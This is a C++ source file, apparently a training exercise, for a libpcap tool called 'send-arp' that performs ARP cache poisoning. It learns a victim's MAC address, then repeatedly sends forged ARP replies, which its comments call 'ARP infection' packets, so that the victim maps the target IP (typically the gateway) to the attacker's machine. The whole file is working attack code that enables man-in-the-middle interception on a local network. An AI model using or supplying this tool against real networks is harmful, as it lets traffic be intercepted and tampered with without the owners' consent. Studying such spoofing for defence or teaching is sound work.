#include <pcap.h>
#include <stdio.h>
#include <cstdio>
#include <vector>
#include <string>
#include <string.h>
#include <unistd.h>
#include <iostream>

#include "NetworkHeader/networkheader.h"
#include "get-my-mac.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	Ethernet eth_;
	Arp arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	std::string interface = argv[1];
	std::vector<std::string> sender_v;
	std::vector<std::string> target_v;

	for(int i=2;i<argc;i+=2){
		sender_v.push_back(argv[i]);
		target_v.push_back(argv[i+1]);
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1, errbuf);

	if (pcap == nullptr) {
	fprintf(stderr, "couldn't open device %s(%s)\n", interface.c_str(), errbuf);
	return -1;
	}

	for(int i = 0; i < (int)sender_v.size(); i++){
		std::string my_mac_str = Get_my_mac(interface);
		std::string sender_ip = sender_v[i];
		std::string target_ip = target_v[i];
		std::string sender_mac_str = "00:00:00:00:00:00";

		printf("-------------\n");
		std::cout << sender_ip << std::endl;
		std::cout << target_ip << std::endl;
		std::cout << my_mac_str << std::endl;
		printf("-------------\n");


		// Step 1: Sender의 MAC 주소를 얻기 위한 ARP Request
		EthArpPacket request;
		
		uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
		uint8_t zero_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
		
		for(int j = 0; j < 6; j++) {
			request.eth_.dst_mac[j] = broadcast_mac[j];
		}
		mac_str_to_byte(my_mac_str, request.eth_.src_mac);
		request.eth_.eth_type = static_cast<Ethernet::Eth_type>(htons(Ethernet::ARP));

		request.arp_.hwtype = htons(Arp::ETHERNET);
		request.arp_.protocol = htons(Arp::IPV4);
		request.arp_.hw_len = 6;
		request.arp_.protocol_len = 4;
		request.arp_.operation = htons(Arp::REQUEST);
		
		mac_str_to_byte(my_mac_str, request.arp_.src_mac);
		request.arp_.src_ip = htonl(0); // 0.0.0.0
		for(int j = 0; j < 6; j++) {
			request.arp_.dst_mac[j] = zero_mac[j];
		}
		request.arp_.dst_ip = htonl(ip_str_to_uint32(sender_ip));
		
		pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&request), sizeof(EthArpPacket));

		// Step 2: ARP Reply 수신
		struct pcap_pkthdr* header;
		const u_char* packet_data;
		
		while (true) {
			int res = pcap_next_ex(pcap, &header, &packet_data);
			if (res == 0) continue;
			if (res == -1 || res == -2) break;
			
			EthArpPacket* recv_packet = (EthArpPacket*)packet_data;
			if (ntohs(recv_packet->eth_.eth_type) == Ethernet::ARP &&
				ntohs(recv_packet->arp_.operation) == Arp::REPLY &&
				ntohl(recv_packet->arp_.src_ip) == ip_str_to_uint32(sender_ip)) {
				sender_mac_str = mac_byte_to_str(recv_packet->arp_.src_mac);
				break;
			}
		}

		// Step 3: ARP Infection 패킷
		EthArpPacket attack_packet;
		
		mac_str_to_byte(sender_mac_str, attack_packet.eth_.dst_mac);
		mac_str_to_byte(my_mac_str, attack_packet.eth_.src_mac);
		attack_packet.eth_.eth_type = static_cast<Ethernet::Eth_type>(htons(Ethernet::ARP));

		attack_packet.arp_.hwtype = htons(Arp::ETHERNET);
		attack_packet.arp_.protocol = htons(Arp::IPV4);
		attack_packet.arp_.hw_len = 6;
		attack_packet.arp_.protocol_len = 4;
		attack_packet.arp_.operation = htons(Arp::REPLY);
		
		mac_str_to_byte(my_mac_str, attack_packet.arp_.src_mac);
		attack_packet.arp_.src_ip = htonl(ip_str_to_uint32(target_ip));
		mac_str_to_byte(sender_mac_str, attack_packet.arp_.dst_mac);
		attack_packet.arp_.dst_ip = htonl(ip_str_to_uint32(sender_ip));

		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		} else {
			printf("ARP infection sent: %s (%s) -> %s\n", 
				   sender_ip.c_str(), sender_mac_str.c_str(), target_ip.c_str());
		}

		// Step 3 이후에 주기적으로 ARP 감염 패킷 재전송
		for(int repeat = 0; repeat < 10; repeat++) {
			int repeat_res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
			if (repeat_res != 0) {
				break; // 전송 실패시 루프 중단
			}
			printf("--\n");
			sleep(2); // 2초 대기
}
	}
	pcap_close(pcap);
}
